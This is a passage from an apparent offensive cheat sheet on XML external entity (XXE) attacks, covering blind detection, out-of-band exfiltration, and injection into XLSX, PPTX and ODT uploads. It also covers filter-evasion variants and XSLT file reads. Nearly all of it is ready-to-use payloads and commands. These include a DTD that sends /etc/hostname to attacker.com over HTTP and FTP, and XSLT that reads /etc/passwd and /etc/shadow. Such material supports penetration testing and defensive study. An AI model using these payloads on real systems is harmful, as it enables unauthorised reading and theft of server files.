--MIME_BOUNDARY--
MIMEEOF
```

---

## 18. Blind XXE Detection Techniques

### 18.1 Time-Based Blind XXE Detection

```bash
# Time-based blind XXE detection via slow HTTP resource
# If the parser blocks for 10 seconds, XXE is likely present
cat > slow_server.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import time

class SlowHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[BLIND XXE DETECTED] {self.client_address}: {self.path}")
        time.sleep(10)  # Delay response to create observable timing
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

HTTPServer(("0.0.0.0", 80), SlowHandler).serve_forever()
PYEOF

# Send payload referencing slow server
curl -X POST "http://target/api" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/delay">]><root>&xxe;</root>'
```

### 18.2 Multi-Channel Blind XXE Confirmation

```bash
# Confirm XXE via multiple OOB channels simultaneously
# HTTP + DNS + FTP for maximum detection probability

# Terminal 1: HTTP listener
python3 -m http.server 80

# Terminal 2: DNS listener (using dnschef)
dnschef --fakeip attacker.com --interface 0.0.0.0

# Terminal 3: FTP listener
python3 -m pyftpdlib -p 2121

# Payload that triggers all three channels
cat > xxe_multi_oob.dtd << 'DTDEOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; http_exfil SYSTEM 'http://attacker.com/http?d=%file;'>">
<!ENTITY % eval2 "<!ENTITY &#x25; ftp_exfil SYSTEM 'ftp://attacker.com:2121/%file;'>">
%eval;
%http_exfil;
%eval2;
%ftp_exfil;
DTDEOF
```

---

## 19. XXE in File Formats (Advanced)

### 19.1 XXE in DOCX/XLSX Manual Injection

```bash
# Manual XXE injection into XLSX (Excel) files
# XLSX is a ZIP archive containing XML files

# Extract the XLSX file
unzip template.xlsx -d xlsx_extracted/

# Inject XXE into xl/sharedStrings.xml (most commonly parsed)
cat > xlsx_extracted/xl/sharedStrings.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-xlsx-callback">
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
  <si><t>&xxe;</t></si>
</sst>
XMLEOF

# Rebuild the XLSX archive
cd xlsx_extracted && zip -r ../malicious.xlsx . && cd ..

# Upload the malicious XLSX
curl -X POST "http://target/upload" \
  -F "file=@malicious.xlsx" \
  -F "type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
```

### 19.2 XXE in PPTX and Other OOXML Formats

```bash
# XXE injection into PPTX (PowerPoint) files
unzip template.pptx -d pptx_extracted/

# Inject into ppt/presentation.xml
cat > pptx_extracted/ppt/presentation.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-pptx-callback">
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:sldIdLst/>
</p:presentation>
XMLEOF

# Rebuild and upload
cd pptx_extracted && zip -r ../malicious.pptx . && cd ..
curl -X POST "http://target/upload" \
  -F "file=@malicious.pptx" \
  -F "type=application/vnd.openxmlformats-officedocument.presentationml.presentation"
```

### 19.3 XXE in OpenDocument Format (ODF)

```bash
# XXE injection into ODT (OpenDocument Text) files
# ODT is also a ZIP archive containing XML

unzip template.odt -d odt_extracted/

# Inject into content.xml
cat > odt_extracted/content.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
  <office:body>
    <office:text>
      <text:p>&xxe;</text:p>
    </office:text>
  </office:body>
</office:document-content>
XMLEOF

# Rebuild and upload
cd odt_extracted && zip -r ../malicious.odt . && cd ..
curl -X POST "http://target/upload" \
  -F "file=@malicious.odt" \
  -F "type=application/vnd.oasis.opendocument.text"
```

---

## 20. XXE Defense Evasion -- WAF and Filter Bypass

### 20.1 XML Entity Obfuscation

```xml
<!-- Use CDATA sections to obfuscate entity references -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><![CDATA[<![CDATA[]]>&xxe;<![CDATA[]]]]><![CDATA[>]]></root>

<!-- Use nested entity references to hide keywords -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "SY">
  <!ENTITY b "STEM">
  <!ENTITY c "&a;&b;">
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Use XML processing instructions to confuse parsers -->
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="http://attacker.com/evil.xsl"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 20.2 XXE via XSLT Injection

```xml
<!-- XSLT stylesheet that reads files (when server processes XSLT) -->
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <output>
      <xsl:copy-of select="document('file:///etc/passwd')"/>
    </output>
  </xsl:template>
</xsl:stylesheet>

<!-- XSLT with embedded XXE in document() function -->
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <output>
      <xsl:value-of select="document('file:///etc/shadow')"/>
    </output>
  </xsl:template>
</xsl:stylesheet>
```

---

## 21. XXE Automation and Tooling

### 21.1 Automated XXE Scanning with XXEer

```bash
# XXEer -- automated XXE testing tool
# Test a list of endpoints for XXE vulnerabilities
python3 xxeer.py -l endpoints.txt --callback http://attacker.com -v

# Test single endpoint with all payload variations
python3 xxeer.py -u "http://target/api/endpoint" --method POST \
  --content-type "application/xml" --callback http://attacker.com
```

### 21.2 Burp Suite XXE Automation

```bash
# Burp Suite active scan with XXE payloads
# 1. Configure Collaborator: Project options -> Misc -> Collaborator server
# 2. Right-click request -> Active scan
# 3. Scanner will test for XXE automatically

# Custom XXE scan check via Burp Extension
# Use the "XXE Scanner" BApp from the BApp Store
# Configure payload list and OOB callback
```
